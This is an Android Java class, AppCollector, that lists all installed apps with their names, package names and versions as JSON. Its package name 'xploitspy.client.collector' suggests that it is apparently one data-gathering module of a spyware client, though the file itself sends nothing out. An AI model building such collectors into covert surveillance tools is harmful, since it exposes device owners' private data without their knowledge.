package com.xploitspy.client.collector;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * AppCollector - Mengumpulkan data Installed Apps
 */
public class AppCollector {
    
    private static final String TAG = "AppCollector";
    private Context context;
    private PackageManager packageManager;
    
    public AppCollector(Context context) {
        this.context = context;
        this.packageManager = context.getPackageManager();
    }
    
    public JSONArray collect() {
        JSONArray apps = new JSONArray();
        
        try {
            for (ApplicationInfo appInfo : packageManager.getInstalledApplications(0)) {
                try {
                    String packageName = appInfo.packageName;
                    String appName = packageManager.getApplicationLabel(appInfo).toString();
                    String version = packageManager.getPackageInfo(packageName, 0).versionName;
                    
                    JSONObject app = new JSONObject();
                    app.put("name", appName);
                    app.put("packageName", packageName);
                    app.put("version", version != null ? version : "unknown");
                    
                    apps.put(app);
                } catch (Exception e) {
                    Log.e(TAG, "Error getting app info for " + appInfo.packageName, e);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting apps", e);
        }
        
        return apps;
    }
}

